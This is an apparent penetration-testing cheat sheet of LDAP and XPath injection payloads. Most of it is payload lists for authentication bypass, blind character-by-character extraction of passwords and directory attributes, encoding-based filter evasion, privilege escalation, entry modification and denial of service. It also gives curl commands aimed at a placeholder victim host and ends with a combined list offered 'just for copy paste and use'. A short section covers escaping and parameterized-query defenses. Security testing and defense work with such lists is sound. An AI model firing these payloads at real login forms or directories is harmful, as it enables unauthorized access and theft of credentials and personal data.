# LDAP / XPATH INJECTION PAYLOADS COMPLETE CHEAT SHEET

## 1. WHAT IS LDAP INJECTION?

**LDAP Injection** occurs when an application inserts user-supplied input into an LDAP query without proper sanitization. LDAP (Lightweight Directory Access Protocol) is used for directory services (Active Directory, OpenLDAP). Attackers can manipulate the query to:

- **Bypass authentication** (login as admin without password)
- **Extract directory data** (users, groups, emails, passwords)
- **Escalate privileges** (add to admin group)
- **Modify or delete directory entries**

**Key fact:** It is in the **OWASP Top 10** under A03:2021 – Injection.

---

## 2. WHAT IS XPATH INJECTION?

**XPath Injection** occurs when an application uses user-supplied input to construct an XPath query for XML data, without proper sanitization. Attackers can manipulate the query to:

- **Bypass authentication**
- **Extract the entire XML document** (structure and data)
- **Access sensitive nodes** (passwords, tokens)
- **Cause DoS** with complex queries

**Key fact:** Same OWASP category – A03:2021 Injection.

---

## 3. LDAP QUERY SYNTAX (QUICK REFERENCE)

| Symbol | Meaning |
|--------|---------|
| `&` | AND |
| `\|` | OR |
| `!` | NOT |
| `=` | Equals |
| `*` | Wildcard (any) |
| `()` | Grouping |
| `(cn=admin)` | Common Name equals admin |
| `(&(cn=admin)(password=secret))` | AND condition |
| `(\|(cn=admin)(cn=user))` | OR condition |
| `(!(cn=admin))` | NOT condition |

---

## 4. LDAP INJECTION – DETECTION PAYLOADS

### 4.1 Basic Syntax Error Probes
```
*
*)(&
*)(|
*))%00
)(cn=*
)(uid=*
)(objectClass=*
\
//
/*
```

### 4.2 Authentication Bypass Payloads

**Username field:**
```
*
*)(&
*)(uid=*
*)(cn=*
admin)(&)
admin)(|(password=*
admin)(|(cn=*
*))(|(cn=*
*))(|(uid=*
)(cn=*
)(uid=*
*)((cn=*))
*)((uid=*))
*))%00
```

**Password field:**
```
*
*)(&
*)(uid=*
*)(cn=*
*))(|(cn=*
*))(|(uid=*
*
*))%00
```

**Both fields:**
```
username=*&password=*
username=admin)(&)&password=*
username=*)(uid=*))(|(uid=*&password=*
username=*)(cn=*))(|(cn=*&password=*
username=admin)(|(password=*&password=*
```

### 4.3 OR-Based Authentication Bypass
```
username=admin)(|(cn=*))(&password=x
username=admin))(|(cn=*)(&password=x
username=*)(|(cn=*)(cn=*))&password=x
```

### 4.4 Wildcard Bypass
```
username=*
username=a*
username=ad*
username=adm*
username=admi*
username=admin*
```

---

## 5. LDAP INJECTION – DATA EXTRACTION (BLIND)

### 5.1 Boolean-Based Extraction
Guess character by character using wildcards.

**Extract username length (indirect):**
```
username=a*)(cn=*
username=aa*)(cn=*
username=aaa*)(cn=*
```

**Extract username character by character:**
```
username=admin*)(cn=*
username=admin1*)(cn=*
username=admin2*)(cn=*
username=admina*)(cn=*
username=adminb*)(cn=*
...
username=adminz*)(cn=*
```

**Extract password (blind):**
```
username=admin)(&(password=a*)
username=admin)(&(password=ab*)
username=admin)(&(password=abc*)
username=admin)(&(password=abcd*)
```

**Common LDAP attributes to extract:**
```
cn
sn
uid
userPassword
mail
telephoneNumber
givenName
displayName
memberOf
description
objectClass
```

### 5.2 Attribute-Based Extraction
```
*)(cn=*
*)(mail=*
*)(userPassword=*
*)(telephoneNumber=*
*)(memberOf=*
*)(description=*
*)(objectClass=*
```

### 5.3 Blind Extraction with AND
```
*)(&(uid=admin)(userPassword=a*)
*)(&(uid=admin)(userPassword=ab*)
*)(&(uid=admin)(userPassword=abc*)
```

### 5.4 Nested Query Injection
```
*)(|(uid=*)(uid=*))(|(uid=*
*))(|(cn=*))(|(cn=*
*)((cn=*)(|(cn=*
```

---

## 6. LDAP FILTER BYPASS / OBFUSCATION

### 6.1 Null Byte
```
*))%00
admin))%00
*)(|(cn=*))%00
```

### 6.2 URL Encoding
```
%2a
%28
%29
%26
%7c
%21
%00
```

**Encoded payloads:**
```
%2a
%2a%29%28%26
%2a%29%28%7c
%2a%29%29%00
admin%29%28%26%29
```

### 6.3 Double URL Encoding
```
%252a
%2528
%2529
%2526
%257c
%2521
```

### 6.4 Unicode / UTF-8
```
%c0%aa  # overlong for *
%c0%a8
%c0%a9
```

### 6.5 Case Variation (attribute names)
LDAP attributes are case-insensitive in most servers:
```
CN=admin
Cn=admin
cN=admin
```

---

## 7. LDAP INJECTION – ADVANCED PAYLOADS

### 7.1 Modify LDAP Entry (if write is possible)
```
*)(&(uid=admin)(|(userPassword=evil))(
```

### 7.2 Add to Admin Group
```
*)(&(uid=admin)(memberOf=cn=admins))(
```

### 7.3 Delete Entry (if allowed)
```
*)(&(uid=admin)(!(uid=admin)))(
```

### 7.4 DoS via Complex Queries
```
*)((|(|(|(|(|(|(|(|(|(|(|(cn=*
*)(&(cn=*)(&(cn=*)(&(cn=*)(&(cn=*)(&(cn=*)
```

---

## 8. XPATH INJECTION – DETECTION PAYLOADS

### 8.1 Basic Syntax Error Probes
```
'
"
)
]
/*
//
*
```

### 8.2 Authentication Bypass Payloads

**Username field:**
```
' or '1'='1
' or 1=1 or ''='
' or 'x'='x
') or ('1'='1
') or (1=1) or (''='
' or count(/*)=1 or '
admin' or '1'='1
admin' or 1=1 or ''='
admin') or ('1'='1
admin') or (1=1) or (''='
```

**Password field:**
```
' or '1'='1
' or 1=1 or ''='
' or 'x'='x
') or ('1'='1
```

**Both fields:**
```
username=admin' or '1'='1&password=admin' or '1'='1
username=admin' or 1=1 or ''='&password=admin' or 1=1 or ''='
```

### 8.3 XPath Function Probes
```
' or count(/*)=1 or '
' or count(/*)=2 or '
' or string-length(/*)=1 or '
' or 1=1 or '
' and 1=2 or '
```

### 8.4 XPath Payloads with Comments (rare)
```
' or '1'='1' or '
' or 1=1 or '
admin' or '1'='1
```

---

## 9. XPATH INJECTION – DATA EXTRACTION (BLIND)

### 9.1 Boolean-Based Character Extraction
```
' or substring(/*/user[1]/username,1,1)='a' or '
' or substring(/*/user[1]/username,1,1)='b' or '
' or substring(/*/user[1]/username,1,1)='c' or '
```

### 9.2 Extract Node Names
```
' or name(/*[1]/*[1])='user' or '
' or name(/*[1]/*[2])='password' or '
' or name(/*[1]/*[3])='email' or '
```

### 9.3 Extract Values
```
' or substring(/*/user[1]/password,1,1)='a' or '
' or substring(/*/user[1]/password,2,1)='b' or '
' or substring(/*/user[1]/password,3,1)='c' or '
```

### 9.4 Count Child Nodes
```
' or count(/*)=1 or '
' or count(/*)=2 or '
' or count(/*/user)=1 or '
' or count(/*/user)=2 or '
```

### 9.5 String Length
```
' or string-length(/*/user[1]/password)=8 or '
' or string-length(/*/user[1]/password)=9 or '
' or string-length(/*/user[1]/password)=10 or '
```

### 9.6 Wildcard (XPath 1.0)
```
' or contains(/*/user[1]/password,'a') or '
' or starts-with(/*/user[1]/password,'a') or '
' or /*/user[1]/password='admin' or '
```

---

## 10. XPATH INJECTION – ADVANCED PAYLOADS

### 10.1 Extract Entire XML
Blind extraction using `count()` and `substring()`:
```
' or count(/*)=1 or '
' or count(/*/*)=1 or '
' or count(/*/*)=2 or '
' or name(/*/*[1])='user' or '
' or name(/*/*[2])='password' or '
```

### 10.2 Using `string()` Function
```
' or string(/*/user[1]/username)='admin' or '
' or string(/*/user[1]/password)='secret' or '
```

### 10.3 XPath DoS (Billion Laughs Equivalent)
```
' or count(//*[contains(name(),'a')])>1 or '
' or string-length(string(/*))>1000000 or '
```

---

## 11. COMBINED / GENERIC PAYLOADS

These work on both LDAP and XPath in many cases:

```
*
*)(&
*)(|
*))(|(cn=*
*))(|(uid=*
*))%00
admin)(&)
admin' or '1'='1
admin' or 1=1 or ''='
admin') or ('1'='1
admin') or (1=1) or (''='
' or '1'='1
' or 1=1 or ''='
' or 'x'='x
') or ('1'='1
' or count(/*)=1 or '
```

---

## 12. TOOLS

| Tool | Usage |
|------|-------|
| **Burp Suite** | Manual testing with Intruder and Repeater. |
| **LDAPXSS / LDAP-Injection-Scanner** | LDAP injection testing. |
| **JXplorer** | LDAP browser to inspect directory structure. |
| **ldapsearch** | Command-line LDAP query tool. |
| **XPath Injection Scanner (Burp)** | Automated XPath testing. |
| **PayloadsAllTheThings** | Repository of LDAP/XPath payloads. |
| **HackTricks** | Complete guide. |

**Commands:**
```bash
# LDAP query with ldapsearch
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(uid=*)"

# Test LDAP injection with curl
curl "http://victim.com/login?user=*&pass=*"
curl "http://victim.com/login?user=admin)(&)&pass=*"

# Test XPath injection
curl "http://victim.com/login?user=admin' or '1'='1&pass=x"
```

---

## 13. DEFENSE / PREVENTION

### 13.1 LDAP Injection Prevention

| Rule | Explanation |
|------|-------------|
| **1. Escape special characters** | Escape `( ) & \| ! * = < > ~` and null bytes. |
| **2. Use parameterized queries** | Use LDAP libraries that support parameterized filters. |
| **3. Validate input** | Whitelist allowed characters (alphanumeric, dash, underscore). |
| **4. Use LDAP bind instead of filters** | Authenticate with `bind` rather than comparing passwords in filters. |
| **5. Principle of least privilege** | LDAP service account should have minimal permissions. |
| **6. Disable anonymous bind** | Require authentication for LDAP queries. |
| **7. Monitor queries** | Detect abnormal filters. |
| **8. WAF** | Use rules specific to LDAP injection. |

**Java (JNDI) – escape example:**
```java
String user = request.getParameter("user");
String filter = "(uid=" + user.replace("\\", "\\5c")
                            .replace("*", "\\2a")
                            .replace("(", "\\28")
                            .replace(")", "\\29")
                            .replace("\0", "\\00") + ")";
```

**Python (python-ldap) – escape example:**
```python
import ldap
from ldap.filter import escape_filter_chars

user = request.args.get("user")
filter_str = f"(uid={escape_filter_chars(user)})"
```

### 13.2 XPath Injection Prevention

| Rule | Explanation |
|------|-------------|
| **1. Use parameterized XPath** | Use libraries that support XPath parameters. |
| **2. Validate input** | Whitelist allowed characters. |
| **3. Escape quotes** | Escape `'` and `"` properly. |
| **4. Avoid dynamic XPath** | Build queries with constants, not user input. |
| **5. Use precompiled XPath** | Use `XPathExpression` with variables (Java). |
| **6. Principle of least privilege** | Restrict access to XML data. |
| **7. WAF and monitoring** | Detect suspicious payloads. |

**Java (XPath) – safe example:**
```java
XPathFactory factory = XPathFactory.newInstance();
XPath xpath = factory.newXPath();
XPathExpression expr = xpath.compile("//user[username/text()=$user]");
expr.setXPathVariableResolver(new MyResolver(user));
NodeList nodes = (NodeList) expr.evaluate(doc, XPathConstants.NODESET);
```

---

## 14. TIPS FOR TESTING

1. Identify login forms, search fields, and any input used in directory or XML queries.
2. Start with a single `*` to test wildcards in LDAP.
3. Start with `' or '1'='1` to test XPath.
4. Try authentication bypass payloads in both username and password fields.
5. If bypass works, try to extract data using boolean-based blind techniques.
6. Use LDAP tools (JXplorer, ldapsearch) to understand the directory structure.
7. For XPath, try `count()`, `string-length()`, `substring()`, `name()`.
8. Test URL-encoded and double-encoded payloads.
9. Check error messages for hints about LDAP/XPath.
10. Always test on your own account first.

---

## 15. QUICK REFERENCE – LDAP OPERATORS

| Operator | Meaning | Example |
|----------|---------|---------|
| `&` | AND | `(&(cn=admin)(pw=secret))` |
| `\|` | OR | `(\|(cn=admin)(cn=user))` |
| `!` | NOT | `(!(cn=admin))` |
| `=` | Equals | `(cn=admin)` |
| `*` | Wildcard | `(cn=*)` |
| `~=` | Approx | `(cn~=admin)` |
| `>=` | Greater or equal | `(age>=18)` |
| `<=` | Less or equal | `(age<=65)` |

---

## 16. QUICK REFERENCE – XPATH FUNCTIONS

| Function | Usage |
|----------|-------|
| `count()` | Count nodes |
| `string-length()` | Length of string |
| `substring()` | Extract substring |
| `name()` | Node name |
| `contains()` | Contains substring |
| `starts-with()` | Starts with substring |
| `string()` | Convert to string |
| `number()` | Convert to number |
| `boolean()` | Convert to boolean |

---

## ALL IN ONE JUST FOR COPY PASTE AND USE IN A TXT FILE

```
*
*)(&
*)(|
*))%00
)(cn=*
)(uid=*
)(objectClass=*
\
//
/*
*)((cn=*))
*)((uid=*))
admin)(&)
admin)(|(password=*
admin)(|(cn=*
*))(|(cn=*
*))(|(uid=*
)(cn=*
)(uid=*
username=*&password=*
username=admin)(&)&password=*
username=*)(uid=*))(|(uid=*&password=*
username=*)(cn=*))(|(cn=*&password=*
username=admin)(|(password=*&password=*
username=admin)(|(cn=*))(&password=x
username=admin))(|(cn=*)(&password=x
username=*)(|(cn=*)(cn=*))&password=x
username=*
username=a*
username=ad*
username=adm*
username=admi*
username=admin*
username=a*)(cn=*
username=aa*)(cn=*
username=aaa*)(cn=*
username=admin*)(cn=*
username=admin1*)(cn=*
username=admin2*)(cn=*
username=admina*)(cn=*
username=adminb*)(cn=*
username=adminz*)(cn=*
username=admin)(&(password=a*)
username=admin)(&(password=ab*)
username=admin)(&(password=abc*)
username=admin)(&(password=abcd*)
*)(cn=*
*)(mail=*
*)(userPassword=*
*)(telephoneNumber=*
*)(memberOf=*
*)(description=*
*)(objectClass=*
*)(&(uid=admin)(userPassword=a*)
*)(&(uid=admin)(userPassword=ab*)
*)(&(uid=admin)(userPassword=abc*)
*)(|(uid=*)(uid=*))(|(uid=*
*))(|(cn=*))(|(cn=*
*)((cn=*)(|(cn=*
%2a
%28
%29
%26
%7c
%21
%00
%2a%29%28%26
%2a%29%28%7c
%2a%29%29%00
admin%29%28%26%29
%252a
%2528
%2529
%2526
%257c
%2521
%c0%aa
%c0%a8
%c0%a9
CN=admin
Cn=admin
cN=admin
*)(&(uid=admin)(|(userPassword=evil))(
*)(&(uid=admin)(memberOf=cn=admins))(
*)(&(uid=admin)(!(uid=admin)))(
*)((|(|(|(|(|(|(|(|(|(|(|(cn=*
*)(&(cn=*)(&(cn=*)(&(cn=*)(&(cn=*)(&(cn=*)
'
"
)
]
/*
//
*
' or '1'='1
' or 1=1 or ''='
' or 'x'='x
') or ('1'='1
') or (1=1) or (''='
' or count(/*)=1 or '
admin' or '1'='1
admin' or 1=1 or ''='
admin') or ('1'='1
admin') or (1=1) or (''='
username=admin' or '1'='1&password=admin' or '1'='1
username=admin' or 1=1 or ''='&password=admin' or 1=1 or ''='
' or count(/*)=2 or '
' or string-length(/*)=1 or '
' and 1=2 or '
' or '1'='1' or '
' or substring(/*/user[1]/username,1,1)='a' or '
' or substring(/*/user[1]/username,1,1)='b' or '
' or substring(/*/user[1]/username,1,1)='c' or '
' or name(/*[1]/*[1])='user' or '
' or name(/*[1]/*[2])='password' or '
' or name(/*[1]/*[3])='email' or '
' or substring(/*/user[1]/password,1,1)='a' or '
' or substring(/*/user[1]/password,2,1)='b' or '
' or substring(/*/user[1]/password,3,1)='c' or '
' or count(/*)=1 or '
' or count(/*)=2 or '
' or count(/*/user)=1 or '
' or count(/*/user)=2 or '
' or string-length(/*/user[1]/password)=8 or '
' or string-length(/*/user[1]/password)=9 or '
' or string-length(/*/user[1]/password)=10 or '
' or contains(/*/user[1]/password,'a') or '
' or starts-with(/*/user[1]/password,'a') or '
' or /*/user[1]/password='admin' or '
' or count(/*/*)=1 or '
' or count(/*/*)=2 or '
' or name(/*/*[1])='user' or '
' or name(/*/*[2])='password' or '
' or string(/*/user[1]/username)='admin' or '
' or string(/*/user[1]/password)='secret' or '
' or count(//*[contains(name(),'a')])>1 or '
' or string-length(string(/*))>1000000 or '
username=*&password=*
username=admin)(&)&password=*
username=*)(uid=*))(|(uid=*&password=*
username=*)(cn=*))(|(cn=*&password=*
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(uid=*)"
curl "http://victim.com/login?user=*&pass=*"
curl "http://victim.com/login?user=admin)(&)&pass=*"
curl "http://victim.com/login?user=admin' or '1'='1&pass=x"
```
